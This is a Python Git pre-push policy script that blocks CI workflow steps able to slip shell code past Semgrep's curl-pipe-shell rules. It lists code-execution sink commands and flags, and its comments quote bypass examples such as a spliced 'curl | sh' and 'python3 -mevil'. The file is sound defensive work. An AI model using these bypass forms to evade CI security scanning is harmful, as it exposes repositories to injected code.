#!/usr/bin/env python3
# ruff: noqa: E402
"""Narrow Git policies that Lefthook cannot express declaratively."""

from __future__ import annotations

import argparse
import ast
import difflib
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import unicodedata
import warnings
from collections import Counter
from collections.abc import Iterator, Mapping, Sequence
from dataclasses import dataclass
from datetime import UTC, datetime
from fnmatch import fnmatch
from functools import lru_cache
from pathlib import Path, PurePosixPath
from typing import NamedTuple, TextIO, cast

_PROJECT_ROOT = Path(__file__).resolve().parents[2]
_VALIDATION_PACKAGE_SENTINEL = _PROJECT_ROOT / "scripts" / "validation" / "models.py"
if _VALIDATION_PACKAGE_SENTINEL.is_file() and str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

import yaml
from yaml.nodes import MappingNode, Node, ScalarNode, SequenceNode

from scripts.validation.object_id import ZERO_SHA_LENGTHS, is_full_object_id
from scripts.validation.pr_commit_count import (
    BLOCK_THRESHOLD,
    MAIN_MERGE_BLOCK_THRESHOLD,
    main_first_parent_shas,
)
from scripts.validation.session_scope import new_session_logs
from scripts.validation.sha_pinning import LOCAL_ACTION_PATTERN, VERSION_TAG_PATTERN

REPO_ROOT = Path(__file__).resolve().parents[2]
PROHIBITED_DASHES = ("\N{EN DASH}", "\N{EM DASH}")
SESSION_PATH_RE = re.compile(r"^\.agents/sessions/\d{4}-\d{2}-\d{2}-session-\d+.*\.json$")
EPISODE_ID_RE = re.compile(r"^episode-[A-Za-z0-9._-]+$")
ADR_PATH_RE = re.compile(r"(?:^|[\\/])ADR-\d+(?:-\w+)*\.md$", re.IGNORECASE)
SESSION_PROTOCOL_PATH_RE = re.compile(r"(?:^|[\\/])SESSION-PROTOCOL\.md$", re.IGNORECASE)
# Composed rather than written out again: the two halves disagreed about
# anchoring for as long as they were separate strings, and a path merely ending
# in the protocol's filename read as the protocol itself.
ADR_REVIEW_PATH_RE = re.compile(
    f"{ADR_PATH_RE.pattern}|{SESSION_PROTOCOL_PATH_RE.pattern}",
    re.IGNORECASE,
)
ADR_ID_RE = re.compile(r"ADR-\d+", re.IGNORECASE)
FRONTMATTER_FIELD_RE = re.compile(r"^([A-Za-z0-9_-]+):(.*)$")
ADR_REVIEW_PATTERNS = (
    re.compile(r"/adr-review"),
    re.compile(r"adr-review skill"),
    re.compile(r"ADR Review Protocol"),
    re.compile(r"multi-agent consensus.{0,200}\bADR\b", re.DOTALL),
    re.compile(r"\barchitect\b.{0,80}\bplanner\b.{0,80}\bqa\b", re.DOTALL),
)
RETROSPECTIVE_EVIDENCE_PATTERNS = (
    re.compile(r"(?i)(##\s*retrospective|retrospective\s*section|learnings?\s*captured)"),
    re.compile(r"(?i)(\.agents/retrospective/|retrospective[-_]?file|retro[-_]?\d{4})"),
)
DOCUMENTATION_PATTERNS = (
    re.compile(r"\.md$"),
    re.compile(r"\.txt$"),
    re.compile(r"(^|/)README$"),
    re.compile(r"(^|/)LICENSE$"),
    re.compile(r"(^|/)CHANGELOG$"),
    re.compile(r"\.gitignore$"),
    re.compile(r"\.editorconfig$"),
)
TRIVIAL_SESSION_SECONDS = 10 * 60
# `type: ignore` is excluded because this gate owns security suppressions.
# Issue #4039 tracks separate enforcement for typing suppressions.
SECURITY_SUPPRESSION_RE = re.compile(
    r"(?:#|//|/\*)\s*"
    r"(?:"
    r"(?:lgtm|codeql)\[|"
    r"nosec\b|"
    r"nosem(?:grep)?\b|"
    r"(?:(?:ruff|flake8)\s*:\s*)?"
    r"noqa\b(?:\s*:\s*(?:[A-Z]+\d+(?:\s*,\s*|\s+))*S\d+\b"
    r"(?:(?:\s*,\s*|\s+)[A-Z]+\d+\b)*|(?!\s*:))|"
    r"cwe-suppress\b"
    r")",
    re.IGNORECASE,
)
SEMGREP_SUFFIXES = frozenset({".js", ".ps1", ".psm1", ".py", ".ts", ".yaml", ".yml"})
RUFF_COUNT_RATCHET = REPO_ROOT / "scripts" / "ci" / "ruff_count_ratchet.py"
BANDIT_SUFFIXES = frozenset({".py", ".pyw"})
TEXTUAL_DIFF_FLAGS = ("--no-ext-diff", "--no-textconv", "--text")
EMPTY_TREE_SHA1 = "4b825dc642cb6eb9a060e54bf8d69288fbee4904"
ACTIVE_GIT_OPERATION_FILES = (
    ("MERGE_HEAD", "merge", "git commit to finish the merge or git merge --abort"),
    ("REBASE_HEAD", "rebase", "git rebase --continue or git rebase --abort"),
    (
        "CHERRY_PICK_HEAD",
        "cherry-pick",
        "git cherry-pick --continue or git cherry-pick --abort",
    ),
)
SEMGREP_POWERSHELL_RULES = frozenset(
    {
        "yaml.github-actions.security.curl-eval.curl-eval",
        "yaml.github-actions.security.gha-curl-pipe-shell.gha-curl-pipe-shell",
    },
)
SEMGREP_POWERSHELL_ERROR_MARKER = (
    "metavariable-pattern failed when parsing $SHELL's content as Bash:"
)
SEMGREP_PARTIAL_RULE_RE = re.compile(
    r"When parsing a snippet as Bash for metavariable-pattern "
    r"in rule '([^'\r\n]+)'(?:,|$)"
)
# The GitHub Actions rules in SEMGREP_POWERSHELL_RULES parse every `run:` scalar
# as Bash. Two shapes defeat that sub-parse without meaning the step is
# unscannable: a scalar another interpreter runs (`shell: pwsh`,
# `shell: python3 {0}`), and a Bash scalar carrying GitHub Actions `${{ }}`
# template syntax, which the runner substitutes before any shell sees it.
# Semgrep reports both as warn-level errors. Tolerate only those two shapes;
# every other scan error still blocks the push.
# Classification is an allowlist of interpreter tokens and argument shapes, not a
# blocklist of shell names. #3683 demonstrated that every name-based blocklist is
# defeatable: `python3 -c "import os;os.system(...)" {0}` reaches `/bin/sh`
# without spelling a shell, ``pwsh -c "bas`h {0}"`` splits the name with a
# backtick, and `cmd /cbash {0}` glues it into a token that `\b` cannot see.
#
# The interpreter token must be exact and lowercase. The Actions runner names the
# step's temp script by looking the FIRST token of `shell:` up in a six-key
# extension table (cmd, pwsh, powershell, bash, sh, python); a miss writes the
# file with no extension. PowerShell's call operator hands an extensionless file
# to the OS, which honours a `#!/bin/bash` first line, so `pwsh.exe -Command "&
# '{0}'"` runs Bash while declaring PowerShell. The `(?:\.exe)?` suffix this
# classification used to accept was itself the bypass, so it is gone.
#
# `perl` is absent deliberately: per `man perlrun`, perl execs the interpreter
# named in a `#!` line that does not contain "perl", so `perl {0}` runs Bash.
# `node`, `ruby`, and `cmd` are absent because this repository uses none of them
# and every entry widens the surface. A push using one blocks, which is the
# correct direction for a security gate.
#
# Bare `python` is absent for the same reason: it is a valid Actions keyword,
# but the declared shells here are 28 `bash`, 33 `pwsh`, and 2 `python3 {0}`,
# so exempting `python` buys surface no caller uses. Refs #3683, #3663.
NON_BASH_INTERPRETERS = frozenset({"pwsh", "powershell", "python3"})
# Flags an interpreter accepts that provably carry no code of their own, keyed
# by interpreter. An allowlist, because a flag is an execution vector: a generic
# "looks like a flag" regex accepted `python3 -mevil {0}`, which runs the
# attacker's module and ignores the workflow's own script, while the gate
# treated the step as a reviewed non-Bash interpreter and skipped the Bash
# rules. Verified against CPython.
#
# Python gets no flags at all. Every flag that changes what Python executes
# (`-c`, `-m`) can be written without a separating space, so no prefix test
# distinguishes them from the harmless ones; the repository only ever uses the
# bare `python3 {0}` form, so permitting nothing else costs nothing.
#
# PowerShell's flags are matched case-insensitively because pwsh itself accepts
# them that way. `-Command` is safe to name here only because its argument must
# still match POWERSHELL_CALL_TOKEN_RE; any other argument text fails closed.
# Refs #3683.
SAFE_SHELL_FLAGS: dict[str, frozenset[str]] = {
    "pwsh": frozenset({"-noprofile", "-nologo", "-noninteractive", "-command"}),
    "powershell": frozenset({"-noprofile", "-nologo", "-noninteractive", "-command"}),
    "python3": frozenset(),
}
# The script placeholder, bare or quoted.
SHELL_PLACEHOLDER_TOKEN_RE = re.compile(r"^[\"']?\{0\}[\"']?$")
# PowerShell's canonical custom-shell template invokes the script through the
# call operator: `pwsh -NoProfile -Command "& '{0}'"`. Permit exactly that shape.
# Any other argument text is free to name a second interpreter.
POWERSHELL_CALL_TOKEN_RE = re.compile(r"^[&.]\s*(?:'\{0\}'|\"\{0\}\"|\{0\})$")
# A leading `#!` hands interpreter choice to the OS, so the `shell:` value stops
# describing what runs. The kernel only honours `#!` at byte 0, so the leading
# whitespace class here is deliberately stricter than it needs to be: it costs
# nothing (no workflow in this repository opens a body with one) and it removes
# the need to reason about who might normalise the body before the kernel sees
# it. Being stricter fails closed, which blocks a push rather than allowing one.
SHEBANG_RE = re.compile(r"^[ \t\r\n]*#!")
ACTIONS_EXPRESSION_RE = re.compile(r"\$\{\{.+?\}\}", re.DOTALL)
# One character standing in for an expression while the body is tokenised. NUL
# cannot appear in a YAML scalar, so it can never collide with real content.
EXPRESSION_SENTINEL = "\x00"
# A word that assigns rather than names a command: `FOO=bar cmd` leaves `cmd` in
# the command slot, so the assignment must not consume it.
SHELL_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\[[^]]*\])?\+?=")
# Reserved words that introduce a command rather than being one. Without these,
# `if true; then c${{ '' }}url x | sh; fi` reads as though `then` were the
# command and the spliced word merely its argument.
SHELL_RESERVED_WORDS = frozenset(
    {
        "!",
        "(",
        ")",
        "{",
        "}",
        "&&",
        "||",
        "|",
        ";",
        "&",
        "case",
        "do",
        "done",
        "elif",
        "else",
        "esac",
        "fi",
        "for",
        "if",
        "in",
        "select",
        "then",
        "time",
        "until",
        "while",
    },
)
# Words that open and close a compound command. A compound opened inside a
# pipeline keeps that pipeline, so `echo payload | while read l; do eval "$l";
# done` reads as one dataflow rather than two unrelated ones.
SHELL_COMPOUND_OPENERS = frozenset({"case", "for", "if", "select", "until", "while", "{"})
SHELL_COMPOUND_CLOSERS = frozenset({"done", "esac", "fi", "}"})
# Commands that run their arguments, or text piped to them, as code. Reaching
# one anywhere in the body means argument position no longer separates data
# from code.
SHELL_SINK_COMMANDS = frozenset(
    {
        ".",
        "ash",
        "awk",
        "bash",
        "builtin",
        "busybox",
        "chroot",
        "command",
        "coproc",
        "dash",
        "doas",
        "env",
        "eval",
        "exec",
        "flock",
        "gawk",
        "ionice",
        "ksh",
        "mawk",
        "nice",
        "nohup",
        "parallel",
        "rbash",
        "runuser",
        "script",
        "setsid",
        "sh",
        "source",
        "ssh",
        "stdbuf",
        "su",
        "sudo",
        "taskset",
        "time",
        "timeout",
        "trap",
        "unbuffer",
        "watch",
        "xargs",
        "zsh",
    },
)
# Interpreters that run a script file by default and only become sinks when an
# argument hands them code directly. Without the flag test, an ordinary
# `python3 build.py --tag "v${{ inputs.version }}"` would be refused. The flags
# are per interpreter: `make -f` reads a makefile as code, but `python3 -f` is
# not a thing, and treating `-f` as universal would refuse every ordinary
# `python3 script.py -f config.yml`.
_INTERPRETER_CODE_FLAGS = frozenset({"-c", "-e", "-", "-E", "--eval", "--command"})
_FIND_CODE_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
SHELL_CODE_FLAG_SINKS: dict[str, frozenset[str]] = {
    "find": _FIND_CODE_FLAGS,
    "lua": _INTERPRETER_CODE_FLAGS,
    "make": frozenset({"-f", "--file", "--makefile"}),
    "node": _INTERPRETER_CODE_FLAGS,
    "perl": _INTERPRETER_CODE_FLAGS,
    "php": _INTERPRETER_CODE_FLAGS,
    "python": _INTERPRETER_CODE_FLAGS,
    "python2": _INTERPRETER_CODE_FLAGS,
    "python3": _INTERPRETER_CODE_FLAGS,
    "ruby": _INTERPRETER_CODE_FLAGS,
}
SHELL_CODE_FLAGS = frozenset[str]().union(*SHELL_CODE_FLAG_SINKS.values())
# A variable reference, so an expression assigned to a name can be followed to
# the command position that later expands it.
SHELL_VARIABLE_REFERENCE_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)")
# A word that is nothing but a variable expansion, in either brace form. The
# sink-alias lookup has to accept both, because `${SH} -c` reaches the same
# shell as `$SH -c`.
SHELL_VARIABLE_WORD_RE = re.compile(r"\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*))")
# Commands whose non-flag arguments name files they write. `tee` does not run
# what it receives, so it is a writer rather than a sink, but it stages a file
# a later sink can execute.
SHELL_FILE_WRITERS = frozenset({"tee"})
# Semgrep sub-parses a run: body as Bash only for a Bash step, so a PowerShell
# step that shells out to any of these is invisible to the ruleset. Refs #3684.
POSIX_SHELLS = frozenset({"ash", "bash", "busybox", "dash", "ksh", "sh", "zsh"})
POWERSHELL_SHELLS = frozenset({"pwsh", "powershell"})
POWERSHELL_EXEC_PARAMETERS = frozenset({"start-process", "-filepath", "saps", "invoke-item"})
POWERSHELL_BLOCK_COMMENT_RE = re.compile(r"<#.*?#>", re.DOTALL)
POWERSHELL_COMMAND_RESET = ";|\n({}&"
# `bash -n` parses without executing. A body it accepts is valid shell, so a
# Semgrep sub-parse failure on it is Semgrep's limitation rather than evidence
# the step is unscannable. A body it rejects is genuinely malformed, and an
# attacker can use that to make Semgrep miss a real finding, so those still
# block. Refs #3663.
BASH_SYNTAX_CHECK_TIMEOUT_SECONDS = 10
SEMGREP_TRUNCATION_RE = re.compile(r"\.\.\. \(truncated \d+ more characters\)$")
SEMGREP_MIN_TRUNCATED_SNIPPET_LENGTH = 80
SEMGREP_BATCH_TARGET_LIMIT = 100


def _ruff_scan_suffixes() -> frozenset[str]:
    """Return suffixes accepted by the repository's Ruff count gate."""
    try:
        module = ast.parse(RUFF_COUNT_RATCHET.read_text(encoding="utf-8"))
    except (OSError, SyntaxError):
        return frozenset({".py"})
    for node in module.body:
        if not isinstance(node, ast.Assign):
            continue
        has_scan_globs_assignment = any(
            isinstance(target, ast.Name) and target.id == "_SCAN_GLOBS" for target in node.targets
        )
        if not has_scan_globs_assignment:
            continue
        try:
            scan_globs = ast.literal_eval(node.value)
        except (ValueError, TypeError):
            return frozenset({".py"})
        if not isinstance(scan_globs, tuple) or not all(
            isinstance(item, str) for item in scan_globs
        ):
            return frozenset({".py"})
        return frozenset(PurePosixPath(item).suffix.lower() for item in scan_globs)
    return frozenset({".py"})


SECURITY_SUPPRESSION_SUFFIXES = SEMGREP_SUFFIXES | BANDIT_SUFFIXES | _ruff_scan_suffixes()
SEMGREP_COMMAND_LENGTH_LIMIT = 24_000
# Lefthook owns the outer deadline; these child-process budgets must finish first.
DEFAULT_SUBPROCESS_TIMEOUT_SECONDS = 90
SEMGREP_TIMEOUT_SECONDS = 840
MYPY_TIMEOUT_SECONDS = 840
WORKFLOW_LOCAL_TIMEOUT_SECONDS = 1_740
# Scope the workflow-local gate to workflows this push changed versus the
# origin/main merge base (three-dot diff). Lefthook's {push_files} is a
# two-dot tree diff against the stale remote tip, so a rebase or force-push
# imports every workflow main advanced past; those are not this branch's
# delta. Override the base ref for tests or non-standard remotes.
WORKFLOW_LOCAL_BASE_REF_ENV = "WORKFLOW_LOCAL_BASE_REF"
WORKFLOW_LOCAL_DEFAULT_BASE = "origin/main"
TEST_SUITE_TIMEOUT_SECONDS = 1_740
CLI_E2E_TIMEOUT_SECONDS = 1_140
SKIPPED_DASH_PREFIXES = (
    "node_modules/",
    ".venv/",
    ".serena/cache/",
    "tests/hooks/fixtures/",
)
# Issue #3671: a git conflict marker committed to a tracked file is never
# intentional. Key only on the labelled `<<<`, `|||`, and `>>>` forms, which git
# always writes with a trailing ref name. A bare `=======` line is deliberately
# not a signal: reStructuredText section underlines and markdown setext headings
# produce it legitimately, and every real conflict carries a labelled marker too.
CONFLICT_MARKER_RE = re.compile(r"^(?:<{7}|\|{7}|>{7}) \S")

# taste_lints.py exit contract: 0 clean, 1 script error, 10 violations found.
# Only 10 means the lint ran and had something to say (issue #3779).
_TASTE_LINT_EXIT_VIOLATIONS = 10
# A NUL in the first 8 KiB is the usual "this is binary" heuristic, and git uses
# the same idea to decide whether to show a diff. Without it the tracked-tree
# scan decodes every PNG and every compiled artifact in the repository to look
# for a marker that cannot be there.
_BINARY_SNIFF_BYTES = 8192
MARKDOWN_FENCE_RE = re.compile(r"^\s*(?:`{3,}|~{3,})")
GIT_ENV_KEYS = (
    "GIT_DIR",
    "GIT_WORK_TREE",
    "GIT_COMMON_DIR",
    "GIT_OBJECT_DIRECTORY",
    "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_GRAFT_FILE",
    "GIT_SHALLOW_FILE",
)
WINDOWS_FORBIDDEN_PATH_CHARS = frozenset('<>:"|?*')
WINDOWS_RESERVED_NAMES = frozenset(
    {"CON", "PRN", "AUX", "NUL"}
    | {f"COM{index}" for index in range(1, 10)}
    | {f"LPT{index}" for index in range(1, 10)}
    | {
        f"{prefix}{suffix}"
        for prefix in ("COM", "LPT")
        for suffix in (
            "\N{SUPERSCRIPT ONE}",
            "\N{SUPERSCRIPT TWO}",
            "\N{SUPERSCRIPT THREE}",
        )
    },
)
GENERATED_PATHS = {
    "mcp": (
        ".vscode/mcp.json",
        ".factory/mcp.json",
    ),
    "memory-index": (".serena/memories/memory-index.md",),
}
GENERATED_GLOBS = {
    "agents": (
        "src/copilot-cli/agents/*.agent.md",
        "src/vs-code-agents/*.agent.md",
        "docs/agent-catalog.md",
    ),
    "episodes": (".agents/memory/episodes/episode-*.json",),
    "memory": (".serena/memories/**/*.md",),
}


@dataclass(frozen=True, slots=True)
class PushRef:
    local_ref: str
    local_sha: str
    remote_ref: str
    remote_sha: str

    @property
    def is_deletion(self) -> bool:
        return _is_zero_sha(self.local_sha)

    @property
    def is_new(self) -> bool:
        return _is_zero_sha(self.remote_sha)


@dataclass(frozen=True, slots=True)
class PushUpdate:
    source: PushRef
    base: str
    head: str
    range_spec: str
    destination_branch: str | None


@dataclass(frozen=True, slots=True)
class SuppressionRenames:
    pure_scanned_destinations: frozenset[str]
    promoted_destinations: frozenset[str]


class PushUpdateConfigError(ValueError):
    """Raised when a pushed ref cannot be resolved to a deterministic range."""


def _clean_git_env() -> dict[str, str]:
    env = os.environ.copy()
    for key in GIT_ENV_KEYS:
        env.pop(key, None)
    for key in tuple(env):
        if key.startswith(("GIT_TEST_COMMIT_GRAPH", "SEMGREP_")):
            env.pop(key)
    env["GIT_NO_REPLACE_OBJECTS"] = "1"
    env["GIT_TEST_COMMIT_GRAPH"] = "0"
    return env


def _run_command(
    args: Sequence[str],
    repo_root: Path,
    *,
    input_text: str | None = None,
    extra_env: Mapping[str, str] | None = None,
    process_env: Mapping[str, str] | None = None,
    timeout_seconds: float = DEFAULT_SUBPROCESS_TIMEOUT_SECONDS,
) -> subprocess.CompletedProcess[str]:
    env = dict(process_env) if process_env is not None else _clean_git_env()
    if extra_env is not None:
        env.update(extra_env)
    command = list(args)
    try:
        return subprocess.run(
            command,
            cwd=repo_root,
            env=env,
            input=input_text,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            check=False,
            timeout=timeout_seconds,
        )
    except subprocess.TimeoutExpired as error:
        stdout = _timeout_text(error.stdout)
        stderr = _append_timeout_message(
            _timeout_text(error.stderr),
            _timeout_message(command, timeout_seconds),
        )
        return subprocess.CompletedProcess(command, 3, stdout, stderr)


def _run_command_bytes(
    args: Sequence[str],
    repo_root: Path,
    *,
    timeout_seconds: float = DEFAULT_SUBPROCESS_TIMEOUT_SECONDS,
) -> subprocess.CompletedProcess[bytes]:
    command = list(args)
    try:
        return subprocess.run(
            command,
            cwd=repo_root,
            env=_clean_git_env(),
            capture_output=True,
            check=False,
            timeout=timeout_seconds,
        )
    except subprocess.TimeoutExpired as error:
        stdout = _timeout_bytes(error.stdout)
        stderr = _append_timeout_bytes(
            _timeout_bytes(error.stderr),
            _timeout_message(command, timeout_seconds).encode(),
        )
        return subprocess.CompletedProcess(command, 3, stdout, stderr)


def _timeout_text(value: bytes | str | None) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return value


def _timeout_bytes(value: bytes | str | None) -> bytes:
    if value is None:
        return b""
    if isinstance(value, str):
        return value.encode()
    return value


def _timeout_message(args: Sequence[str], timeout_seconds: float) -> str:
    subject = _timeout_subject(args)
    return f"ERROR: {subject} timed out after {timeout_seconds:g} seconds\n"


def _timeout_subject(args: Sequence[str]) -> str:
    if not args:
        return "subprocess"
    executable = Path(args[0]).name
    if executable.startswith("python"):
        return _python_timeout_subject(executable, args[1:])
    if executable == "git":
        return _git_timeout_subject(args[1:])
    if executable in {"gh", "lefthook", "uv"} and len(args) > 1:
        subcommand = _safe_timeout_token(args[1])
        if subcommand is not None:
            return f"{executable} {subcommand}"
    return executable


def _python_timeout_subject(executable: str, args: Sequence[str]) -> str:
    if len(args) >= 2 and args[0] == "-m":
        module = _safe_timeout_token(args[1])
        return f"{executable} -m {module}" if module is not None else executable
    if not args:
        return executable
    script = _safe_timeout_token(Path(args[0]).name)
    if script is None:
        return executable
    subject = f"{executable} {script}"
    if len(args) > 1:
        subcommand = _safe_timeout_token(args[1])
        if subcommand is not None:
            subject = f"{subject} {subcommand}"
    return subject


def _git_timeout_subject(args: Sequence[str]) -> str:
    index = 0
    while index < len(args):
        token = args[index]
        if token == "-c":
            index += 2
            continue
        if token.startswith("-"):
            index += 1
            continue
        subcommand = _safe_timeout_token(token)
        return f"git {subcommand}" if subcommand is not None else "git"
    return "git"


def _safe_timeout_token(token: str) -> str | None:
    if re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]{0,63}", token):
        return token
    return None


def _append_timeout_message(stderr: str, message: str) -> str:
    separator = "" if not stderr or stderr.endswith("\n") else "\n"
    return f"{stderr}{separator}{message}"


def _append_timeout_bytes(stderr: bytes, message: bytes) -> bytes:
    separator = b"" if not stderr or stderr.endswith(b"\n") else b"\n"
    return stderr + separator + message


def _run_git(
    repo_root: Path,
    args: Sequence[str],
) -> subprocess.CompletedProcess[str]:
    return _run_command(_git_command(args), repo_root)


def _run_git_bytes(
    repo_root: Path,
    args: Sequence[str],
) -> subprocess.CompletedProcess[bytes]:
    return _run_command_bytes(_git_command(args), repo_root)


def _git_command(args: Sequence[str]) -> list[str]:
    return ["git", "-c", "core.commitGraph=false", *args]


def _safe_relative_path(raw_path: str) -> str | None:
    if "\\" in raw_path:
        return None
    path = PurePosixPath(raw_path)
    if not raw_path or path.is_absolute() or ".." in path.parts:
        return None
    return path.as_posix()


def _safe_output_path(repo_root: Path, relative_path: str) -> Path | None:
    safe_path = _safe_relative_path(relative_path)
    if safe_path is None:
        return None
    resolved_root = repo_root.resolve()
    candidate = repo_root / safe_path
    current = candidate
    while current != repo_root:
        if current.is_symlink():
            return None
        current = current.parent
    resolved_candidate = candidate.resolve(strict=False)
    try:
        resolved_candidate.relative_to(resolved_root)
    except ValueError:
        return None
    return candidate


def check_generated_paths(kind: str, repo_root: Path) -> int:
    paths = list(GENERATED_PATHS.get(kind, ()))
    paths.extend(pattern.split("*", 1)[0].rstrip("/") for pattern in GENERATED_GLOBS.get(kind, ()))
    for relative_path in paths:
        if _safe_output_path(repo_root, relative_path) is None:
            print(f"ERROR: unsafe generated output path: {relative_path}", file=sys.stderr)
            return 2
    return 0


def _read_index_blob(repo_root: Path, relative_path: str) -> bytes | None:
    result = _run_git_bytes(repo_root, ["show", f":{relative_path}"])
    if result.returncode != 0:
        return None
    return result.stdout


def _read_head_blob(repo_root: Path, relative_path: str) -> bytes | None:
    result = _run_git_bytes(repo_root, ["show", f"HEAD:{relative_path}"])
    if result.returncode != 0:
        return None
    return result.stdout


def _read_blob_bytes(repo_root: Path, revision: str) -> bytes | None:
    """Read a blob without letting text mode rewrite it.

    ``_run_git`` decodes with ``errors="replace"`` and universal newlines, so a
    CRLF copy and an LF copy of the same file come back equal, and two files
    differing only in undecodable bytes do too. Callers here compare blobs to
    decide whether a merge carried content, and an equality that lossy hands
    that decision to whoever stages the lossy copy. Refs #3679.
    """
    result = _run_git_bytes(repo_root, ["show", revision])
    if result.returncode != 0:
        return None
    return result.stdout


def check_branch(repo_root: Path) -> int:
    result = _run_git(repo_root, ["symbolic-ref", "--quiet", "--short", "HEAD"])
    if result.returncode == 1:
        return 0
    if result.returncode != 0:
        print("ERROR: could not determine the current branch", file=sys.stderr)
        return 2
    branch = result.stdout.strip()
    if branch not in {"main", "master"}:
        return 0
    print(f"ERROR: cannot commit or push directly to '{branch}'", file=sys.stderr)
    return 1


def _current_branch(repo_root: Path) -> str | None:
    """Return the current branch name, or None when it cannot be determined.

    Empty output is a detached HEAD; a nonzero exit means git could not
    answer. Both collapse to None so the caller fails open.
    """
    result = _run_git(repo_root, ["branch", "--show-current"])
    if result.returncode != 0:
        return None
    branch = result.stdout.strip()
    return branch or None


def _recent_date_prefixes() -> tuple[str, str]:
    """Return today's and yesterday's UTC date strings for cross-midnight tolerance."""
    from datetime import timedelta

    now = datetime.now(tz=UTC)
    today = now.strftime("%Y-%m-%d")
    yesterday = (now - timedelta(days=1)).strftime("%Y-%m-%d")
    return today, yesterday


def _recent_session_candidates(sessions_dir: Path) -> list[Path] | None:
    """Return today's and yesterday's session logs, or None if unreadable.

    The two-day window handles cross-midnight UTC sessions. Returning None
    rather than an empty list keeps "directory unreadable" distinguishable
    from "no logs today", because both callers fail open on the former.
    """
    if not sessions_dir.is_dir():
        return None
    today, yesterday = _recent_date_prefixes()
    candidates: list[Path] = []
    try:
        candidates.extend(sessions_dir.glob(f"{today}-session-*.json"))
        candidates.extend(sessions_dir.glob(f"{yesterday}-session-*.json"))
    except OSError:
        return None
    return candidates


def _session_log_for_branch(sessions_dir: Path, branch: str) -> Path | None:
    """Return a recent session log whose branch field is ``branch``."""
    candidates = _recent_session_candidates(sessions_dir)
    if candidates is None:
        return None
    for candidate in sorted(candidates):
        if _session_branch(candidate) == branch:
            return candidate
    return None


def _is_merged_history(repo_root: Path, path: Path) -> bool:
    """Return True when ``path`` already exists on the upstream default branch.

    A committed merge of main imports the previously merged branch's session
    log. That file is newer by mtime than anything the current branch owns, so
    it wins the recency comparison and names a branch this one has never been
    near (issue #3343). The MERGE_HEAD exemption cannot help: it expires when
    the merge commit is created, while the imported file stays forever.

    Existing on the upstream default branch is the discriminator. A log that
    merged is settled history, not a statement about what the developer is
    working on now. A log authored on some other local branch is not there, so
    the co-mingling case from issue #682 keeps its teeth.

    Fails closed on every indeterminate answer it can observe: a path outside
    the repo, no resolvable ``origin/HEAD``, or a failed probe all return False
    and the mismatch still blocks.

    It cannot fail closed on git being unavailable, and does not claim to.
    ``_run_command`` catches only ``TimeoutExpired``, so a missing git binary
    raises ``FileNotFoundError`` past this function into the blanket handler in
    ``check_branch_context``, which returns 0. That is the deliberate fail-open
    contract of the caller, not an exemption this function grants, and
    ``_current_branch`` would already have taken the same exit several lines
    earlier. Pinned by
    ``test_branch_context_fails_open_when_git_is_unavailable``.
    """
    try:
        relative = path.relative_to(repo_root).as_posix()
    except ValueError:
        return False
    head = _run_git(repo_root, ["rev-parse", "--abbrev-ref", "origin/HEAD"])
    upstream = head.stdout.strip() if head.returncode == 0 else ""
    if not upstream:
        return False
    probe = _run_git(repo_root, ["cat-file", "-e", f"{upstream}:{relative}"])
    return probe.returncode == 0


def _is_linked_worktree(repo_root: Path) -> bool:
    """Return True when ``repo_root`` is a linked worktree, not the primary checkout.

    A linked worktree has its own ``.git`` directory under the primary one's
    ``worktrees/``, so the two paths differ. Comparing them is the only probe
    git offers that does not depend on how the caller spelled the path.

    Fails closed: any indeterminate answer reports False and the caller keeps
    its normal behaviour.
    """
    own = _run_git(repo_root, ["rev-parse", "--absolute-git-dir"])
    shared = _run_git(repo_root, ["rev-parse", "--git-common-dir"])
    if own.returncode != 0 or shared.returncode != 0:
        return False
    own_text = own.stdout.strip()
    shared_text = shared.stdout.strip()
    if not own_text or not shared_text:
        return False
    try:
        own_path = Path(own_text).resolve()
        shared_path = (repo_root / shared_text).resolve()
    except OSError:
        return False
    return own_path != shared_path


def _is_committed_here(repo_root: Path, path: Path) -> bool:
    """Return True when ``path`` exists in the current checkout's ``HEAD``.

    In a linked worktree, presence in HEAD indicates the file arrived with
    the checkout rather than being created in the working tree during this
    session.  The proxy is imperfect: a log committed during the current
    session would also satisfy this test.  The guard is acceptable because
    the worktree exemption only fires in combination with
    ``_is_linked_worktree``, and linked-worktree users do not typically
    commit session logs to their feature branch mid-session.
    """
    try:
        relative = path.relative_to(repo_root).as_posix()
    except ValueError:
        return False
    probe = _run_git(repo_root, ["cat-file", "-e", f"HEAD:{relative}"])
    return probe.returncode == 0


def _today_session_log(sessions_dir: Path) -> Path | None:
    """Return the newest recent session log by mtime, or None.

    Checks both today's and yesterday's UTC dates to handle cross-midnight
    sessions gracefully. Follows hook_utilities.get_today_session_log selection
    semantics (newest UTC-dated session log by mtime) with the per-file stat
    resilience of hook_utilities._newest_by_mtime: a single unreadable candidate
    (deleted or renamed mid-scan, permission race) is skipped rather than
    blinding the check to every other valid log. An empty match or an unreadable
    directory yields None so branch-context checking fails open.
    """
    candidates = _recent_session_candidates(sessions_dir)
    if candidates is None:
        return None
    best: Path | None = None
    best_mtime = float("-inf")
    for candidate in candidates:
        try:
            mtime = candidate.stat().st_mtime
        except OSError as exc:
            warnings.warn(
                f"Skipping unreadable session log {candidate}: {exc}",
                stacklevel=2,
            )
            continue
        if mtime > best_mtime:
            best_mtime = mtime
            best = candidate
    return best


def _split_frontmatter(content: bytes) -> tuple[bytes, bytes]:
    """Split a document into its frontmatter and its body, without decoding.

    The body is what callers compare for "unchanged", and that question is
    about bytes. Decoding first with ``errors="replace"`` maps every byte the
    decoder cannot read to the same replacement character, so two bodies
    holding different invalid bytes came back equal and a real body edit rode
    in under a metadata change.
    """
    lines = content.splitlines(keepends=True)
    if not lines or lines[0].strip() != b"---":
        return b"", content
    for index in range(1, len(lines)):
        if lines[index].strip() == b"---":
            return b"".join(lines[1:index]), b"".join(lines[index + 1 :])
    return b"", content


